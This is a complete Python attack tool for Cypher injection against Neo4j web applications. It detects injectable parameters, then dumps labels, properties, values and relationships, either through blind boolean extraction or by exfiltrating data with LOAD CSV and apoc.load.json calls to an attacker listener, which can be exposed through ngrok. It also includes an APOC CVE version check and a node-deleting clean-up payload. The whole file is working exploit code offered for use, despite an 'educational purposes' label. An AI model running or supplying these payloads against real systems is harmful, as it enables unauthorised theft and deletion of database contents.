#!/usr/bin/python3
import argparse
import requests
from urllib.parse import unquote, quote
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import netifaces as ni
import queue
import re
import sys
import json
import os
import string
import random
import time
import math
from tabulate import tabulate
from pyngrok import ngrok
from packaging import version
from termcolor import colored


data_queue = queue.Queue()

# Helper functions
def get_ip_address(network_interface):
    """Retrieve the IP address for a given network interface."""
    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']

def extract_query_params(query_string):
    """
    Extracts param=value into json format
    """
    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
    matches = pattern.findall(query_string)
    return {key: value for key, value in matches}


def get_data(timeout=5):
    """
    URL Decode and return value ?data=value
    """
    try:
        data = data_queue.get(timeout=timeout)
        parsed_data = extract_query_params(data)
        # %2520 -> %20 -> <space>
        parsed_data = {unquote(unquote(key)): unquote(unquote(value)) for key, value in parsed_data.items()}
        value = parsed_data.get('data')
        return value


    except queue.Empty:
        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?"), "red")
        return None


def get_parsed_data(timeout=5):
    """
    URL Decode and return dictionary {data: ''}
    """
    try:
        data = data_queue.get(timeout=timeout)
        parsed_data = extract_query_params(data)
        # %2520 -> %20 -> <space>
        parsed_data = {unquote(unquote(key)): unquote(unquote(value)) for key, value in parsed_data.items()}
        return parsed_data

    except queue.Empty:
        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?"), "red")
        return None


def fully_dynamic_convert_data(original_data):
    """
    Format dictionary
    """
    converted_data = {}

    # Process each key in the original dictionary
    for key, compound_value in original_data.items():
        # Split the compound value into components based on '::'
        components = compound_value.split('::')
        
        # Iterate over each component
        for component in components:
            # Split the component into index and the actual value, after decoding
            index, value = component.split(':', 1)

            # Ensure a dictionary for the index exists in converted_data
            if index not in converted_data:
                converted_data[index] = {}

            # Assign the value to the correct key within the indexed dictionary
            converted_data[index][key] = value

    # Ensure all dictionaries have all keys from the original data, set to None if not present
    all_keys = list(original_data.keys())
    for index_dict in converted_data.values():
        for key in all_keys:
            index_dict.setdefault(key, None)

    return converted_data

def convert_dict_to_table(data):
    """
    Converts python dictionary to a table
    - Adds an additional header called "ID"
    """
    
    if not data:
        return "The input data is empty."
    
    # add header ID
    headers = ['ID'] + list(next(iter(data.values())).keys())
    table_data = []

    for index, attributes in data.items():
        # create a row for each item, prepending the index
        # skip ID header
        row = [index] + [attributes.get(header) for header in headers[1:]]  
        table_data.append(row)

    # Use tabulate to generate the table
    table = tabulate(table_data, headers=headers, tablefmt="grid")
    print(table)





def write_json_to_file(json_data, filename="output.json"):
    """Write JSON data to a file."""

    output_dir = os.path.join(os.getcwd(), "output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    file_path = os.path.join(output_dir, filename)
    with open(file_path, 'w') as file:
        file.write(json.dumps(json_data, indent=2))

def check_vulnerability(apoc_version):
    """
    Checks if the given version is affected by any of the vulnerabilities
    """
    vulnerability_data = {
        "CVE-2021-42767: Path traversal in several apoc.* functions": [("0", "3.5.0.17"), ("0", "4.2.0.10"), ("0", "4.3.0.4"), ("0", "4.4.0.1")],
        "CVE-2022-37423: Partial Path Traversal Vulnerability": [("0", "4.4.0.8"), ("0", "4.3.0.7"), ("0", "4.2.0.12"), ("0", "4.1.0.12"), ("0", "3.5.0.20")],
        "CVE-2022-23532: Path Traversal Vulnerability": [("0", "4.3.0.12"), ("0", "4.4.0.12")],
        "CVE-2023-23926: XML External Entity (XXE) vulnerability in apoc.import.graphml": [("0", "4.4.0.14")]
    }
    affected_advisories = []
    counter = 0
    current_version = version.parse(apoc_version)
    for advisory, affected_ranges in vulnerability_data.items():
        for lower, upper in affected_ranges:
            if version.parse(lower) <= current_version < version.parse(upper):
                affected_advisories.append(advisory)
                counter += 1
                break  # Stop checking other ranges for this advisory if already found affected

    if affected_advisories:
        print(f"\nAPOC Version {apoc_version} is affected by these vulnerabilities [{counter}]:")
        for advisory in affected_advisories:
            print(f"[*] {advisory}")
    else:
        print(f"APOC Version {apoc_version} is not affected by the known vulnerabilities.")


class RequestHandler(BaseHTTPRequestHandler):
    """Handles HTTP GET requests."""
    def do_GET(self):
        data_queue.put(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    def log_message(self, format, *args):
        return

class Listener():
    """A simple HTTP server listening for data."""
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        self.server.serve_forever()

    def stop_listener(self):
        self.server.shutdown()

class Neo4jInjector:
    """Handles the injection of payloads into a Neo4j database."""
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None, blind_string=""):
        self.target = target
        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie if cookie else ""
        self.blind_string = blind_string
        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
        self.proxies = {'http': 'http://127.0.0.1:8080'}
        self.base_case = None
        self.working_char = ""

    def inject_payload(self, payload):
        """Inject a crafted payload to the target and return the response object."""
        responses = []
        if (self.working_char != "UNDEFINED"):
            full_payload = f"{self.blind_string}{self.working_char}{payload}"
            encoded_payload = quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            responses.append(response)
        else:
            for injection_char in ["'", "\"", "'})", "\"})", ""]:
                full_payload = f"{self.blind_string}{injection_char}{payload}"
                encoded_payload = quote(full_payload, safe='')
                url, data = self.prepare_request_data(encoded_payload)
                response = self.execute_request(url, data)
                responses.append(response)
        return responses

    def prepare_request_data(self, encoded_payload):
        """Prepare the URL and data for the request."""
        if self.request_type == "API":
            url = f"{self.target}{self.parameters}{encoded_payload}"
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        """Execute the HTTP request with the prepared data and return the response."""
        try:
            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if response.status_code == 302:
                print("302 Redirect, Cookies Expired/Invalid ?")
                sys.exit()
            return response  # Return the response object
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")
        return None

    def check_true(self, result):
        if (result):
                if (result.text == self.base_case.text):
                    return True
                elif (self.blind_string in result.text):
                    base_split = self.base_case.text.split(self.blind_string)
                    res_split = result.text.split(self.blind_string)
                    if (len(base_split) == len(res_split)):
                        true_count = 0
                        for i in range(len(res_split)):
                            if (base_split[i] == res_split[i]):
                                true_count += 1
                        return (true_count >= math.ceil(len(res_split) * 0.9))
        return False

    def detect_inject(self):
        random.seed(time.strftime("%H:%M:%S", time.localtime()))
        random_num = random.randint(0, 999)
        print("Determining if the target is injectable")
        injection_characters = ["'", "\"", "'})", "\"})", ""]
        encoded_payload = quote(self.blind_string, safe='')
        url, data = self.prepare_request_data(encoded_payload)
        self.base_case = self.execute_request(url, data)
        if (not self.base_case or self.base_case.status_code == 500):
            if (input("Seems like something went wrong, continue? (y|N)").lower != "y"):
                sys.exit()
        for injection_character in injection_characters:
            injection_case = None
            self.working_char = injection_character
            if (self.working_char == ""):
                payload = f" OPTIONAL MATCH (x:foobar) WHERE {random_num} = {random_num}"
            elif (self.working_char == "'})"):
                payload = " OPTIONAL MATCH (x:foo {bar: '" + str(random_num)
            elif (self.working_char == "\"})"):
                payload = " OPTIONAL MATCH (x:foo {bar: \"" + str(random_num)
            else:
                payload = f" OPTIONAL MATCH (x:foo) WHERE {self.working_char}{random_num}{self.working_char}={self.working_char}{random_num}"
            injection_case = self.inject_payload(payload)[0]
            if (self.check_true(injection_case)):
                return True
        self.working_char = "UNDEFINED"
        return False
            

    def exfil_data(self):

        self.exfil_payload = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"

        print("\n[*] APOC Check [*]")
        self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")

        apoc_version = get_data()
        if apoc_version is None:
            apoc_version = False

        nested_dict = {'-': {'apoc_version': apoc_version}}
        convert_dict_to_table(nested_dict)

        if apoc_version != False:
            check_vulnerability(apoc_version)
            option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
            if option == "y":
                self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//" 
            elif option == "n":
                print("\n[*] Continuing with LOAD CSV [*]")

        print("\n[*] Version Check [*]")
        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT replace(name,' ', '%20') as name,version,edition WITH name +':'+version+':'+edition as exfilData {self.exfil_payload}")

        version_parts = get_data().split(':')
        name, version, edition = version_parts[0], version_parts[1], version_parts[2]

        if version_parts:
            nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
            convert_dict_to_table(nested_dict)
        else:
            print("[!] Not vulnerable")
            sys.exit()

        if edition == 'enterprise':
            print(colored("\n[!] Neo4j Enterprise edition is detected, RBAC configuration could be blocking our payload.\n", "yellow"))

        # dump label count
        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as exfilData {self.exfil_payload}")

        label_count = get_data()
        
        # dump labels
        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label as exfilData WITH COLLECT(exfilData) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")

        labels = get_data().split('::') 

        print(f"\n[*] available labels [{label_count}]:")
        for label in labels:
            print(f"[+] {label}")

        node_counts = []
        for label in labels:
            # dump node count
            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
            node_count = get_data()  
            node_counts.append(node_count)

            # Dump property count
            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")

            property_count = get_data()  

            # dump properties
            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")

            print(f"\n[*] Label: {label}")
            print(f"[+] available properties [{property_count}]:")
            properties = get_data().split('::')

            for pr0perty in properties:
                print(f"[++] {pr0perty}")

            properties_dict = {}
            for pr0perty in properties:
                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
                parsed_data = get_parsed_data()
                # replace key name to pr0perty variable
                parsed_data[pr0perty] =  parsed_data.pop("data")

                properties_dict.update(parsed_data)

            formatted_dict = fully_dynamic_convert_data(properties_dict)
            write_json_to_file(formatted_dict, f'{label}.json')

            
            print(f"[{node_count} entries]")
            convert_dict_to_table(formatted_dict)

        
    def exfil_relationship(self):

        print("\n[*] Using LOAD CSV to Exfiltrate Relationships [*]")
        # dump relationship count
        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as exfilData {self.exfil_payload}")

        relationship_count = get_data()  

        if relationship_count is None or relationship_count == '0':
            print("[!] The database might not have any relationships. Exiting...")
            sys.exit()

        # dump relationships type
        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")

        
        print(f"\n[*] relationships types [{relationship_count}]:")
        relationships = get_data().split('::')
        for relationship in relationships:
            print(f"[+] {relationship}")

        # dump relationships
        found_relationships = []
        counter = 0 
        for rel_type in relationships:
            # Initial payload injection to get relationships list
            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
            
            relationships_list = get_data().split('::')

            for relationship in relationships_list:
                relationship_parts = relationship.split(':')
                id1, rel_type, id2 = relationship_parts[0], relationship_parts[1], relationship_parts[2]
                # verify relationship
                # process each relationship direction
                for id_from, id_to in [(id1, id2), (id2, id1)]:
                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as exfilData {self.exfil_payload}")
                    if not data_queue.empty():
                        counter += 1
                        relationship = get_data()
                        found_relationships.append(relationship)
            
        print(f"\n[*] available relationships [{counter}]")
        for rel_type in relationships:
            print(f"[+] {rel_type}")
            for relationship in found_relationships:
                regex_rel_type = re.findall(r"\[:([^\]]+)\]", relationship)[0]
                if regex_rel_type == rel_type:
                    print(f"[++] {relationship}")



    def clean_up(self):
        self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")

    def complete_blind_payload(self, condition):
        random.seed(time.strftime("%H:%M:%S", time.localtime()))
        random_num = random.randint(0, 999)
        if (self.working_char == ""):
            payload = f" AND {condition} AND {random_num} = {random_num}"
        elif (self.working_char == "'})"):
            payload = " WHERE " + condition + " OPTIONAL MATCH (x:foo {bar: '" + str(random_num)
        elif (self.working_char == "\"})"):
            payload = " WHERE " + condition + " OPTIONAL MATCH (x:foo {bar: \"" + str(random_num)
        else:
            payload = f" AND {condition} AND {self.working_char}{random_num}{self.working_char}={self.working_char}{random_num}"
        return payload

    def find_label_count(self):
        for count_index in range(1000):
            responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index}"))
            # responses = self.inject_payload(f" AND COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index} and '1'='1")
            for response in responses:
                if (self.check_true(response)):
                    return count_index
        return 0

    def find_label_sizes(self, label_count):
        label_sizes_dict = {}
        for count_index in range(label_count):
            break_flag = False
            for size_index in range(1000):
                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
                # responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}  AND '1' = '1")
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                        label_sizes_dict[count_index] = size_index
                        break
                if (break_flag):
                    break
                # if any(self.blind_string in response.text for response in responses):
                #     label_sizes_dict[count_index] = size_index
                #     break
        return label_sizes_dict

    def dump_labels(self, label_sizes):
        valid_chars = string.ascii_letters + string.digits + string.punctuation
        labels = []
        for count_index, size in label_sizes.items():
            label = ''
            for size_index in range(size):
                break_flag = False
                for char in valid_chars:
                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}}"))
                    # responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}} AND '1' = '1")
                    print(f"Found Label: {label}{char}", end='\r')
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                            label += char
                            break
                    if (break_flag):
                        break
                    # if any(self.blind_string in response.text for response in responses):
                    #     label += char
                    #     break
            labels.append(label)
        return labels


    def find_property_counts(self, labels):
        property_counts_dict = {}
        for label in labels:
            break_flag = False
            for count_index in range(1000):
                responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {count_index}"))
                # responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {count_index} AND '1' = '1")
                # Check for the blind string in each response
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                        property_counts_dict[label] = count_index
                        break
                if (break_flag):
                    break
                # if any(self.blind_string in response.text for response in responses):
                #     property_counts_dict[label] = count_index
                #     break
        return property_counts_dict

    def find_property_sizes(self, property_counts_dict):
        property_sizes_dict = {}

        for label, count in property_counts_dict.items():
            for count_index in range(count):
                break_flag = False 
                for size_index in range(1000):
                    # Construct and send your query
                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
                    # responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}} AND '1' = '1")
                    # Debugging print statement to show the current n value
                    print(f"{label} - {count_index} prop size {size_index}")
                    # Check if the blind string is in any of the responses
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                                if label not in property_sizes_dict:
                                    property_sizes_dict[label] = {}
                                # Now that we're sure label exists in value_counts, record the count
                                property_sizes_dict[label][count_index] = size_index
                                print(f"Found '{self.blind_string}' in response for label {label}, count {count_index}, size {size_index}")
                                break  # Stop searching after finding the blind string for this property
                    if (break_flag):
                        break
                    # if any(self.blind_string in response.text for response in responses):
                    #     if label not in property_sizes_dict:
                    #         property_sizes_dict[label] = {}
                    #     # Now that we're sure label exists in value_counts, record the count
                    #     property_sizes_dict[label][count_index] = size_index
                    #     print(f"Found '{self.blind_string}' in response for label {label}, count {count_index}, size {size_index}")
                    #     break  # Stop searching after finding the blind string for this property
        return property_sizes_dict


    def dump_properties(self, property_sizes_dict):
        valid_chars = string.ascii_letters + string.digits + string.punctuation
        properties_dict = {}
        for label, size_dict in property_sizes_dict.items():
            for count_index, size in size_dict.items():
                pr0perty = ''
                for size_index in range(size):
                    break_flag = False
                    for char in valid_chars:
                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(list[{count_index}],{size_index},1) = '{char}' RETURN list}}"))
                        # responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(list[{count_index}],{size_index},1) = '{char}' RETURN list}} AND '1' = '1")
                        # Check if any of the responses contain the blind string
                        for response in responses:
                            break_flag = self.check_true(response)
                            if (break_flag):
                                    print(f"Found '{self.blind_string}' in response for property {count_index}, size {size_index}, character {char}")
                                    pr0perty += char
                                    break  # Exit the inner loop once the blind string is found
                        if (break_flag):
                            break
                        # if any(self.blind_string in response.text for response in responses):
                        #     print(f"Found '{self.blind_string}' in response for property {count_index}, size {size_index}, character {char}")
                        #     pr0perty += char
                        #     break  # Exit the inner loop once the blind string is found

                if label in properties_dict:
                    properties_dict[label].append(pr0perty)
                else:
                    properties_dict[label] = [pr0perty]

        return properties_dict

    def find_value_count(self, properties_dict):
        value_counts_dict = {}
        for label, properties in properties_dict.items():
            for pr0perty in properties:
                break_flag = False
                for count_index in range(1000):
                    responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) RETURN x.{pr0perty}}} = {count_index}"))
                    # responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) RETURN x.{pr0perty}}} = {count_index} AND '1' = '1")
                    # Check for the blind string in each response
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                            # Ensure the label is in value_counts, creating a dict for it if not
                            if label not in value_counts_dict:
                                value_counts_dict[label] = {}
                            # Now that we're sure label exists in value_counts, record the count
                            value_counts_dict[label][pr0perty] = count_index
                            print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, count {count_index}")
                            break  # Stop searching after finding the blind string for this property
                    if (break_flag):
                        break
                    # if any(self.blind_string in response.text for response in responses):
                    #     # Ensure the label is in value_counts, creating a dict for it if not
                    #     if label not in value_counts_dict:
                    #         value_counts_dict[label] = {}
                    #     # Now that we're sure label exists in value_counts, record the count
                    #     value_counts_dict[label][pr0perty] = count_index
                    #     print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, count {count_index}")
                    #     break  # Stop searching after finding the blind string for this property
        return value_counts_dict


    def find_value_size(self, value_counts_dict):
        value_sizes_dict = {}
        for label, properties_dict in value_counts_dict.items():
            value_sizes_dict[label] = {}
            for pr0perty, count in properties_dict.items():
                value_sizes_dict[label][pr0perty] = {}
                for count_index in range(count):  # Assuming 'size' here actually meant 'count' in your initial approach
                    break_flag = False
                    for size_index in range(1000):  # Assuming 'n' is the size you're looking to determine
                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
                        # responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}} AND '1' = '1")
                        # Check for the blind string in each response
                        for response in responses:
                            break_flag = self.check_true(response)
                            if (break_flag):
                                if count_index not in value_sizes_dict[label][pr0perty]:
                                    value_sizes_dict[label][pr0perty][count_index] = size_index
                                print(f"Found '{self.blind_string}' in response for label {label}, pr0perty {pr0perty}, occurrence {count_index} with size {size_index}")
                                break  # Found the size for this occurrence, no need to continue
                        if (break_flag):
                            break
                        # if any(self.blind_string in response.text for response in responses):
                        #     if count_index not in value_sizes_dict[label][pr0perty]:
                        #         value_sizes_dict[label][pr0perty][count_index] = size_index
                        #     print(f"Found '{self.blind_string}' in response for label {label}, pr0perty {pr0perty}, occurrence {count_index} with size {size_index}")
                        #     break  # Found the size for this occurrence, no need to continue
        return value_sizes_dict

    def dump_value(self, value_sizes_dict):
        valid_chars = string.ascii_letters + string.digits + string.punctuation
        values = []
        for label, properties_dict in value_sizes_dict.items():
            for pr0perty, size_dict in properties_dict.items():
                for count_index, size in size_dict.items():
                    value = ''
                    for size_index in range(size):
                        break_flag = False
                        for char in valid_chars:
                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}}"))
                            # responses = self.inject_payload(f" AND EXISTS {{ MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}} AND '1' = '1")
                            for response in responses:
                                break_flag = self.check_true(response)
                                if (break_flag):
                                    value += char
                                    print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, occurrence {count_index} with size {size_index}, with char {char}")
                                    break  # Found the size for this occurrence, no need to continue
                            if (break_flag):
                                break
                            # if any(self.blind_string in response.text for response in responses):
                            #     value += char
                            #     print(f"Found '{self.blind_string}' in response for label {label}, property {pr0perty}, occurrence {count_index} with size {size_index}, with char {char}")
                            #     break  # Found the size for this occurrence, no need to continue
                    values.append(value)
        return values

    def blind(self):
        label_count = self.find_label_count()
        label_sizes_dict = self.find_label_sizes(label_count)
        print(label_sizes_dict)
        labels = self.dump_labels(label_sizes_dict)
        print(labels)
        property_counts_dict = self.find_property_counts(labels)
        print(property_counts_dict)
        property_sizes_dict = self.find_property_sizes(property_counts_dict)
        print(property_sizes_dict)
        properties_dict = self.dump_properties(property_sizes_dict)
        value_counts_dict = self.find_value_count(properties_dict)
        value_sizes_dict = self.find_value_size(value_counts_dict)
        values = self.dump_value(value_sizes_dict)


        print(f"\n[*] available labels [{label_count}]:")
        for label in labels:
            print(f"[+] {label}")


        print(properties_dict)
        for label, properties in properties_dict.items():
            print(f"\n[*] Label: {label}")
            print(f"[+] available properties [{len(properties)}]")
            for pr0perty in properties:
                print(f"[++] {pr0perty}")

        print(value_counts_dict)
        print(value_sizes_dict)
        print(values)

def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
    parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
    parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
    args = parser.parse_args()

    listener = Listener(args.listen_port)
    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
    listener_thread.start() 

    if args.int == "public":
        ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
        if ngrok_auth_token:
            ngrok.set_auth_token(ngrok_auth_token)
        else:
            print("Ngrok auth token not set. Please set the NGROK_AUTH_TOKEN environment variable.")
            sys.exit(1)
        start_ngrok = ngrok.connect(args.listen_port, "tcp")
        url = start_ngrok.public_url.replace("tcp://", "http://")
        hostname, port = url.split("://")[1].split(":")
        args.exfil_ip = f"http://{hostname}"
        args.listen_port = int(port)
        
        print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
    elif args.int:
        args.exfil_ip = f"http://{get_ip_address(args.int)}"
    else:
        args.exfil_ip = "127.0.0.1"


    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)

    if (injector.detect_inject()):
        print(colored("Target likely injectable, continuing"),"green")
        print(f"working character: {injector.working_char}")
    else:
        if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
            return

    # Begin exfiltration process
    injector.blind()
    # injector.exfil_data()
    # injector.exfil_relationship()
    # injector.clean_up()

    listener.stop_listener()
    listener_thread.join()

    if args.int == "public":
        ngrok.disconnect(start_ngrok.public_url)

if __name__ == "__main__":
    main()